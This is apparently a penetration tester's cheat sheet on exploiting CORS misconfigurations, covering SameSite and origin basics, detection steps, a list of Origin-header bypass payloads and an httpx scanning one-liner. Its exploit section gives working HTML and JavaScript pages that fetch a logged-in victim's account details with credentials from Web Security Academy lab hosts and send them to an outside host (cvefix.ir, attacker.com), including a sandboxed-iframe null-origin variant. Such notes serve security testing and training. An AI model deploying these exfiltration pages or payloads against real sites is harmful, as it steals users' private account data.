# Basic
- **Site:** eTLD + 1  →  `cvefix.ir`
  - `SameSite: None`: The cookie will be sent between different sites.
  - `SameSite: Lax`: The cooke will be sent between different sites, just for `GET` requests with *Top-Level-Navigation*.
     - Top-Level-Navigation is redirection by click on a link.
     - `<img>`, `<iframe>` and `<script>` do not cause top-level navigation. 
- **Origin:** scheme://Host:Port  →  `https://cvefix.ir:443`
  - Can be checked with `console.log(origin)`
  - SOP permits scripts on first web page to access data in a second web page, if both web pages have the same origin.
  - browser set the `origin` header and it can't be spoofed by JavaScript.
  - SOP does not work for `<script>`, `<img>`
- Developers use *postMessage*, *JSONP* and *CORS* to remove restriction of SOP.

# Detection
- The web-app must work with **Cookies** (NOT token) that has `SameSite = None`.
- Find a path that returns users sensitive information.
- The request to the above path must be simple (not preflight):
  - Verb: `GET` or `POST` or `HEAD`
  - No custom header
  - Content-Type: `application/x-www-form-urlencoded` or `multipart/form-data` or `text/plain`. (NOT `json`)
- Set `Origin: target.tld` header in all requests. (use the *same URL* and not attacker.com)
- Check for existance of these headers in resposne:
  ```bash
  Access-Control-Allow-Origin: target.tld
  Access-Control-Allow-Credentials: True
  ```
- Then try bypass methods.

# Bypass
- `Origin` payloads for `https://domain.tld` & `https://subdomain.domain.tld`
  ```html
  https://target.tld.attacker.com
  https://target.tldattacker.com 
  https://attacker.comtarget.tld
  https://subdomain.attackertarget.tld
  https://subdomain.target.attacker.tld
  https://subdomain.targetattacker.tld
  null
  attacker.computer
  https://target.tld%60.attacker.com
  https://foo@attacker.tld:80@target.tld
  https://foo@evil-host%20@target.tld
  ```
- If there is no bypass try fuzz different `[FUZZ].target.tld[FUZZ]` in `origin` header.
  - Don't brute force blindly and first extract all subdomains of target and make a list.
  - Check the list to see what is the whitelist.
  - Try to find XSS in the subdomains to extract data from target domain. (Can be used for XSS pots exploitation)
  
# Exploit
- Deliver these codes to a user that is logged-in in the vulnerable web-app. (*cvefix.ir* should server on *https*)
  - **XMLHttpRequest**: Run `tail -f /var/log/nginx/access.log` in VPS to see target's data.
    ```html
    <!DOCTYPE html>
    <html>
    <body>
    <h2>test</h2>
    <script>
    function loadXMLDoc() {
       var xhttp = new XMLHttpRequest();
       xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
             var xhttp2 = new XMLHttpRequest();
             xhttp2.open('GET', 'https://cvefix.ir/?data=' + escape(this.responseText));
             xhttp2.send();
          }
       };
       xhttp.open('GET', 'https://0a65001c04c61b3280636ca200b30023.web-security-academy.net/accountDetails');
       xhttp.withCredentials = true;
       xhttp.send();
    }
    loadXMLDoc();
    </script>
    </body>
    </html>
    ```
  - **fetch**
    ```html
    <!DOCTYPE html>
    <html>
    <body>
    <h2>test</h2>
    <script>
    function loadDoc() {
      fetch('https://0acf00b50382d89a824e422b00f800dc.web-security-academy.net/accountDetails', { credentials: 'include' })
        .then(response => response.text())
        .then(data => {
          fetch(`https://cvefix.ir/?data=${encodeURIComponent(data)}`);
        });
    }
    loadDoc();
    </script>
    </body>
    </html>
    ```
- Exploiting `Origin: null`: The sandbox attribute is used to generate a null origin request by preventing the iframe from inheriting the origin of the parent page.  
  ```html
  <!DOCTYPE html>
  <html>
  <body>
  <h2>test</h2>
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://0aa2004e04b0d9548084a3c500730027.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();
      function reqListener() {
          location='https://cvefix.ir/?key='+encodeURIComponent(this.responseText);
      };
  </script>"></iframe>
  </script>
  </body>
  </html>
  ```
- Little JS exploit to use in browser console:
  ```javascript
  fetch("https://domain.tld/api/information/me", {
      credentials: "include"
  })
  .then((response) => {
      document.location = "//attacker.com/log?key={0}".format(response.text());
  });
  ```

# Automation
- Assets  →  FLinks  →  HTTPX  →  CORS Misconfiguration
  ```bash
  cat assets | while read domain; do httpx -H "Origin: https://$domain" -sr -silent; done
  ```

# Tip
- In Firefox we should click on {separ} icon next to url and disable *Enhanced Tracking Protection*
- CORS occur on the URL (not domain), so we should check all pathes for this vulnerability. (All pathes should extracted by *Burp manually* and *FLink*)
- It does not matter if site uses CORS or not.
- CORS on the site is rare because it will be discoverd quickly. We should find CORS on a whitlisted subdomain that have **XSS** vulnerability.
- `Access-Control-Allow-Origin: *` is not exploitable, as CORS doesn’t allow credentials, including cookies, authentication headers, or client-side certificates, to be sent with requests.


# Resource
- https://book.hacktricks.xyz/pentesting-web/cors-bypass
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
